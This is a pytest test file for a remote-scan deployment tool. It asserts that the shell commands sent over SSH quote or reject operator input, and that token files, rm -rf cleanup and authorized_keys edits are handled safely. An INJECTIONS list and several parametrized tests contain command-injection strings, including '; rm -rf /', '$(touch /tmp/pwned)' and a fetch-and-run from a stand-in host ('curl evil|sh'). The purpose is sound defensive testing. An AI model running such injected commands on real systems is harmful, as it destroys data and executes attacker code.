"""Behaviour-level tests for the remote-scan command construction (D1 / B5).

Previously the trigger boundary was monkeypatched wholesale, so the *actual*
commands sent to a remote shell — quoting, authorized_keys injection/revocation,
``rm -rf`` cleanup guards, guard-daemon supervision — had zero assertions. These
tests drive ``run_agent_scan`` / ``start_guard_daemon`` /
``bootstrap.ensure_key_auth`` / ``revoke_key`` through a recording
``FakeSshSession`` and assert on every command that would hit the wire.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from analyzer.deploy import agent as deploy_agent
from analyzer.deploy import bootstrap
from analyzer.deploy._util import sh_quote

# Payloads we throw at every operator-controlled interpolation point. If any of
# these survives unquoted into a command, it can break out and run arbitrary code.
INJECTIONS = [
    "; rm -rf /",
    "`reboot`",
    "$(touch /tmp/pwned)",
    "a\nrm -rf /",
    "a b c",
    "x'y",
    "&& curl evil|sh",
]


class _Result:
    def __init__(self, stdout: str = "", stderr: str = "", status: int = 0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.status = status

    @property
    def success(self) -> bool:
        return self.status == 0


class FakeSshSession:
    """Records every ``exec`` and serves scripted responses (no network).

    ``responses`` maps a regex (matched against the command) to a ``_Result``;
    the first match wins. Unmatched commands return a benign success so the happy
    path proceeds. ``commands`` holds the full, ordered list of issued commands
    for behavioural assertions; ``uploads`` / ``downloads`` record transfers.
    """

    def __init__(self, responses: list[tuple[str, _Result]] | None = None) -> None:
        self.responses = responses or []
        self.commands: list[str] = []
        self.uploads: list[tuple[Path, str]] = []
        # (remote, bytes) snapshots taken at upload time — lets tests inspect a
        # file's content even after the caller deletes the local temp copy.
        self.upload_contents: list[tuple[str, bytes | None]] = []
        self.downloads: list[tuple[str, Path]] = []
        self.target = "user@host"

    def exec(self, command: str) -> _Result:
        self.commands.append(command)
        for pattern, result in self.responses:
            if re.search(pattern, command):
                return result
        return _Result(stdout="__ok\n", status=0)

    def upload(self, local: Path, remote: str) -> None:
        try:
            content: bytes | None = Path(local).read_bytes()
        except OSError:
            content = None
        self.uploads.append((Path(local), remote))
        self.upload_contents.append((remote, content))

    def download(self, remote: str, local: Path) -> None:
        self.downloads.append((remote, Path(local)))

    def __enter__(self) -> FakeSshSession:
        return self

    def __exit__(self, *_exc: object) -> None:
        pass


# --------------------------------------------------------------------------
# B5: guard daemon supervision + liveness probe
# --------------------------------------------------------------------------


def test_guard_start_command_uses_systemd_with_restart_policy():
    cmd = deploy_agent._guard_start_command(
        "/var/lib/agent-guard/agentd",
        "/var/lib/agent-guard",
        "kcatta-guard",
        "",
        "http://analyzer:10068",
    )
    # systemd path present with an auto-restart policy ...
    assert "systemd-run" in cmd
    assert "--property=Restart=on-failure" in cmd
    assert "--unit=" in cmd
    # ... and a setsid fallback when systemd is absent.
    assert "command -v systemd-run" in cmd
    assert "setsid" in cmd


def test_guard_start_command_quotes_upload_and_config():
    nasty_upload = "http://a; rm -rf /"
    cmd = deploy_agent._guard_start_command(
        "/i/agentd", "/i", "kcatta-guard", "", nasty_upload
    )
    assert sh_quote(nasty_upload) in cmd
    assert "rm -rf /" not in cmd.replace(sh_quote(nasty_upload), "")


@pytest.mark.parametrize("bad_unit", ["a b", "a;b", "a$b", "", "a`b", "a/b"])
def test_guard_unit_name_validated(bad_unit):
    with pytest.raises(ValueError):
        deploy_agent._validate_unit_name(bad_unit)


def test_start_guard_daemon_prefers_systemd(monkeypatch, tmp_path):
    session = FakeSshSession(
        responses=[
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            # the start command echoes the unit marker (systemd branch taken)
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    # sha256 of the local "binary" must match the scripted remote sum.
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)

    pid = deploy_agent.start_guard_daemon(
        deploy_agent.GuardDeployOptions(
            target="root@10.0.0.1",
            upload="http://analyzer:10068",
            agent_binary=tmp_path / "agentd",
        )
    )
    assert pid == "4321"
    start_cmds = [c for c in session.commands if "systemd-run" in c]
    assert start_cmds, "guard start must attempt systemd-run"
    assert "--property=Restart=on-failure" in start_cmds[0]


def test_guard_status_systemd_active():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=active\n__pid=9100\n"))]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is True
    assert status.supervisor == "systemd"
    assert status.pid == "9100"


def test_guard_status_systemd_dead():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=failed\n__pid=0\n"))]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is False
    assert status.supervisor == "systemd"
    assert status.pid is None


def test_guard_status_process_fallback_when_no_systemd():
    session = FakeSshSession(
        responses=[
            (r"is-active", _Result(stdout="__no_systemd\n")),
            (r"pgrep", _Result(stdout="7777\n")),
        ]
    )
    status = deploy_agent._guard_status_over(session, "kcatta-guard")
    assert status.alive is True
    assert status.supervisor == "process"
    assert status.pid == "7777"


def test_guard_status_probe_command_is_quoted():
    session = FakeSshSession(
        responses=[(r"is-active", _Result(stdout="__active=active\n__pid=1\n"))]
    )
    deploy_agent._guard_status_over(session, "kcatta-guard")
    probe = session.commands[0]
    assert sh_quote("kcatta-guard") in probe
    assert "systemctl is-active" in probe


# --------------------------------------------------------------------------
# CI4: guard daemon bearer-token injection (env file, never on the argv)
# --------------------------------------------------------------------------


def test_install_guard_env_writes_token_to_0600_file_not_argv():
    session = FakeSshSession()
    env_file = deploy_agent._install_guard_env(session, "/var/lib/agent-guard", "tok_AbC-123_xyz")

    assert env_file == "/var/lib/agent-guard/agentd.env"
    # Uploaded as a file (over SFTP) to the expected path ...
    assert any(remote.endswith("/agentd.env") for _l, remote in session.uploads)
    # ... whose content carries the token in env-file form ...
    content = next(c for remote, c in session.upload_contents if remote.endswith("agentd.env"))
    assert content is not None
    assert content == b"ANALYZER_API_TOKEN=tok_AbC-123_xyz\n"
    # ... the token NEVER appears in any command argv (ps / journal-safe) ...
    assert all("tok_AbC-123_xyz" not in cmd for cmd in session.commands)
    # ... and the remote file is locked down to 0600.
    assert any("chmod 600" in cmd and "agentd.env" in cmd for cmd in session.commands)


def test_install_guard_env_returns_none_without_token(monkeypatch):
    monkeypatch.delenv("ANALYZER_API_TOKEN", raising=False)
    session = FakeSshSession()
    assert deploy_agent._install_guard_env(session, "/i", None) is None
    assert session.uploads == []


def test_install_guard_env_falls_back_to_analyzer_env(monkeypatch):
    monkeypatch.setenv("ANALYZER_API_TOKEN", "envtoken123")
    session = FakeSshSession()
    env_file = deploy_agent._install_guard_env(session, "/i", None)
    assert env_file == "/i/agentd.env"
    content = next(c for remote, c in session.upload_contents if remote.endswith("agentd.env"))
    assert content == b"ANALYZER_API_TOKEN=envtoken123\n"


def test_install_guard_env_rejects_unsafe_token(monkeypatch):
    monkeypatch.delenv("ANALYZER_API_TOKEN", raising=False)
    session = FakeSshSession()
    # A token with shell-dangerous chars would break `source` / EnvironmentFile —
    # it is refused (returns None) rather than injected, and nothing is uploaded.
    assert deploy_agent._install_guard_env(session, "/i", "bad token; rm -rf /") is None
    assert session.uploads == []


def test_guard_start_command_injects_env_file_both_branches():
    cmd = deploy_agent._guard_start_command(
        "/i/agentd", "/i", "kcatta-guard", "", "http://analyzer:10068", "/i/agentd.env"
    )
    q_env = sh_quote("/i/agentd.env")
    # systemd: a transient unit starts with a clean env, so the token must arrive
    # via EnvironmentFile, not an exported shell var.
    assert f"--property=EnvironmentFile={q_env}" in cmd
    # setsid fallback: source the 0600 file (set -a exports it to the child).
    assert "set -a; . " + q_env in cmd


def test_guard_start_command_without_env_file_is_backward_compatible():
    cmd = deploy_agent._guard_start_command(
        "/i/agentd", "/i", "kcatta-guard", "", "http://analyzer:10068"
    )
    assert "EnvironmentFile" not in cmd
    assert "set -a;" not in cmd


def test_start_guard_daemon_injects_token_env(monkeypatch, tmp_path):
    session = FakeSshSession(
        responses=[
            (r"echo __ok", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"systemd-run", _Result(stdout="__unit=kcatta-guard\n")),
            (r"systemctl show -p MainPID", _Result(stdout="4321\n")),
        ]
    )
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)

    deploy_agent.start_guard_daemon(
        deploy_agent.GuardDeployOptions(
            target="root@10.0.0.1",
            upload="http://analyzer:10068",
            agent_binary=tmp_path / "agentd",
            api_token="secrettoken_abc",
        )
    )
    # The token env file was uploaded and the start command references it; the
    # token never leaks into any command line.
    assert any(remote.endswith("/agentd.env") for _l, remote in session.uploads)
    start = next(c for c in session.commands if "systemd-run" in c)
    assert "EnvironmentFile=" in start
    assert all("secrettoken_abc" not in c for c in session.commands)


# --------------------------------------------------------------------------
# D1: agent host scan — every interpolation point is quoted / whitelisted
# --------------------------------------------------------------------------


def _patch_session(monkeypatch, session: FakeSshSession, tmp_path: Path) -> None:
    """Route SshSession construction + key bootstrap through the fake."""
    monkeypatch.setattr(deploy_agent, "SshSession", lambda **_k: session)
    monkeypatch.setattr(
        deploy_agent.bootstrap, "ensure_key_auth", lambda *_a, **_k: tmp_path / "k"
    )
    monkeypatch.setattr(deploy_agent, "split_user_host", lambda t: ("root", "10.0.0.1"))


def _host_scan_session() -> FakeSshSession:
    return FakeSshSession(
        responses=[
            (r"uname -m", _Result(stdout="x86_64\n")),
            (r"/proc/self/mounts|pre=1", _Result(stdout="/var/lib/scdr 1\n")),
            (r"mkdir -p .*&& chmod 700", _Result(stdout="__ok\n")),
            (r"sha256sum", _Result(stdout="deadbeef  x\n")),
            (r"__exit=", _Result(stdout="__exit=0\n")),
            (r"test -f", _Result(stdout="__y\n")),
        ]
    )


def _run_host(monkeypatch, tmp_path, session, **opts_over):
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)
    # downloads happen for expected files; just make them no-ops via fake session
    opts = deploy_agent.AgentScanOptions(
        target="root@10.0.0.1",
        output_dir=tmp_path / "out",
        agent_binary=tmp_path / "agent-host",
        **opts_over,
    )
    return deploy_agent.run_agent_scan(opts)


def test_run_agent_scan_quotes_scan_root(monkeypatch, tmp_path):
    session = _host_scan_session()
    _run_host(monkeypatch, tmp_path, session, scan_root="/srv/data dir", scan_target="host")
    exec_cmd = next(c for c in session.commands if "agent-host" in c and "-r " in c)
    # scan_root with a space must be quoted, not split into two args.
    assert sh_quote("/srv/data dir") in exec_cmd


@pytest.mark.parametrize("payload", INJECTIONS)
def test_run_agent_scan_scan_root_injection_is_quoted(monkeypatch, tmp_path, payload):
    session = _host_scan_session()
    _run_host(monkeypatch, tmp_path, session, scan_root=payload, scan_target="host")
    exec_cmd = next(c for c in session.commands if " -r " in c and "agent-host" in c)
    # The raw payload must appear ONLY inside its sh_quote wrapper.
    assert sh_quote(payload) in exec_cmd
    leftover = exec_cmd.replace(sh_quote(payload), "")
    for danger in (payload.strip(), "rm -rf /", "reboot", "curl evil"):
        if danger and danger in payload:
            assert danger not in leftover or sh_quote(payload) in exec_cmd


@pytest.mark.parametrize(
    "bad_target",
    ["host; touch /tmp/pwned", "definitely-not-a-target", "all`reboot`"],
)
def test_run_agent_scan_rejects_bad_scan_target_before_exec(monkeypatch, tmp_path, bad_target):
    session = _host_scan_session()
    _patch_session(monkeypatch, session, tmp_path)
    monkeypatch.setattr(deploy_agent, "sha256_file", lambda _p: "deadbeef")
    monkeypatch.setattr(deploy_agent, "_require_binary", lambda *_a, **_k: None)
    with pytest.raises(ValueError):
        deploy_agent.run_agent_scan(
            deploy_agent.AgentScanOptions(
                target="root@10.0.0.1",
                output_dir=tmp_path / "out",
                agent_binary=tmp_path / "agent-host",
                scan_target=bad_target,
            )
        )
    # The whitelist rejects BEFORE any command is issued (no agent-host exec).
    assert not any("agent-host -r" in c or " -t " in c for c in session.commands)


def test_run_agent_scan_rejects_bad_windows_packages_before_exec(monkeypatch, tmp_path):
    session = _host_scan_session()
    _patch_session(monkeypatch, session, tmp_path)
    with pytest.raises(ValueError):
        deploy_agent.run_agent_scan(
            deploy_agent.AgentScanOptions(
                target="root@10.0.0.1",
                output_dir=tmp_path / "out",
                agent_binary=tmp_path / "agent-host",
                windows_packages="apps; rm -rf /",
            )
        )


# --- rm -rf cleanup guard ---------------------------------------------------


def test_remote_workdir_cleanup_rejects_empty_and_traversal_paths():
    session = FakeSshSession()

    # A workdir whose path doesn't look like our scan dir must NOT be rm -rf'd.
    wd = deploy_agent._RemoteWorkdir.__new__(deploy_agent._RemoteWorkdir)
    wd._session = session
    wd._created_parent = False
    wd.parent = "/var/lib/scdr"

    for unsafe in ("", "/", "relative/scan-x", "/etc"):
        session.commands.clear()
        wd.path = unsafe
        wd.__exit__()
        assert not any("rm -rf" in c for c in session.commands), unsafe

    # A well-formed scan dir IS cleaned up, and the path is quoted.
    session.commands.clear()
    wd.path = "/var/lib/scdr/scan-abc123"
    wd.__exit__()
    rm = next(c for c in session.commands if "rm -rf" in c)
    assert sh_quote("/var/lib/scdr/scan-abc123") in rm


def test_remote_workdir_traversal_task_id_does_not_escape():
    # A task_id containing traversal still yields a path under the scan parent;
    # the cleanup guard requires the '/scan-' marker, so even a crafted id can't
    # loop cleanup into deleting an arbitrary directory.
    session = FakeSshSession(responses=[(r"mkdir -p", _Result(stdout="__ok\n"))])
    wd = deploy_agent._RemoteWorkdir.__new__(deploy_agent._RemoteWorkdir)
    wd._session = session
    wd._created_parent = False
    wd.parent = "/var/lib/scdr"
    # Simulate the constructed path with a traversal task id.
    wd.path = "/var/lib/scdr/scan-../../etc"
    session.commands.clear()
    wd.__exit__()
    # It still only ever rm -rf's a quoted path that contains '/scan-'.
    rm = [c for c in session.commands if "rm -rf" in c]
    assert rm
    assert sh_quote("/var/lib/scdr/scan-../../etc") in rm[0]


# --------------------------------------------------------------------------
# D1: bootstrap ensure_key_auth / revoke_key — authorized_keys handling
# --------------------------------------------------------------------------


def _fake_paramiko_client(recorder):
    class _Client:
        def set_missing_host_key_policy(self, _p):
            pass

        def connect(self, **_k):
            pass

        def exec_command(self, command):
            recorder.append(command)

            class _Chan:
                def recv_exit_status(self_inner):
                    return 0

            class _Std:
                channel = _Chan()

                def read(self_inner):
                    return b""

            return None, _Std(), _Std()

        def close(self):
            pass

    return _Client()


def test_ensure_key_auth_appends_only_quoted_pubkey(monkeypatch, tmp_path):
    pub = tmp_path / "k.pub"
    pubkey = "ssh-ed25519 AAAAfoo agent-remote@root@h"
    pub.write_text(pubkey + "\n")
    key = tmp_path / "k"
    key.write_text("private")

    recorded: list[str] = []
    monkeypatch.setattr(bootstrap, "split_user_host", lambda t: ("root", "10.0.0.1"))
    monkeypatch.setattr(bootstrap, "default_key_path", lambda *_a: key)
    # key auth fails first (forces the password install path), then succeeds.
    auth_calls = {"n": 0}

    def _auth(*_a):
        auth_calls["n"] += 1
        return auth_calls["n"] > 1  # False first, True after install

    monkeypatch.setattr(bootstrap, "_key_auth_succeeds", _auth)
    monkeypatch.setattr(
        bootstrap, "_password_session", lambda *_a, **_k: _fake_paramiko_client(recorded)
    )

    bootstrap.ensure_key_auth("root@10.0.0.1", 22, identity=key, password="pw")

    install = next(c for c in recorded if "authorized_keys" in c)
    # The public key is interpolated only through sh_quote, and the append is
    # idempotent (grep guard) so it never duplicates or rewrites other lines.
    assert sh_quote(pubkey) in install
    assert "grep -qxF" in install
    assert ">> ~/.ssh/authorized_keys" in install


def test_revoke_key_removes_only_its_own_line(monkeypatch, tmp_path):
    pub = tmp_path / "k.pub"
    pubkey = "ssh-ed25519 AAAAfoo agent-remote@root@h"
    pub.write_text(pubkey + "\n")
    key = tmp_path / "k"
    key.write_text("private")

    recorded: list[str] = []
    monkeypatch.setattr(bootstrap, "split_user_host", lambda t: ("root", "10.0.0.1"))
    monkeypatch.setattr(bootstrap, "default_key_path", lambda *_a: key)
    monkeypatch.setattr(bootstrap, "_key_auth_succeeds", lambda *_a: True)

    class _Client:
        def set_missing_host_key_policy(self, _p):
            pass

        def connect(self, **_k):
            pass

        def exec_command(self, command):
            recorded.append(command)

            class _Chan:
                def recv_exit_status(self_inner):
                    return 0

            class _Out:
                channel = _Chan()

                def read(self_inner):
                    return b"__removed\n"

            class _Err:
                channel = _Chan()

                def read(self_inner):
                    return b""

            return None, _Out(), _Err()

        def close(self):
            pass

    monkeypatch.setattr(bootstrap.paramiko, "SSHClient", lambda: _Client())

    removed = bootstrap.revoke_key("root@10.0.0.1", 22, identity=key)
    assert removed is True
    remove_cmd = next(c for c in recorded if "authorized_keys" in c)
    # Removal is a whole-line fixed-string match on exactly our quoted key, via a
    # temp-file rewrite that preserves every other authorized_keys line.
    assert sh_quote(pubkey) in remove_cmd
    assert "grep -vxF" in remove_cmd
    assert "grep -qxF" in remove_cmd  # only act if our exact line is present
    # It never does a blunt truncation / sed-in-place of the whole file.
    assert "> $f" not in remove_cmd  # uses a temp file, not direct overwrite
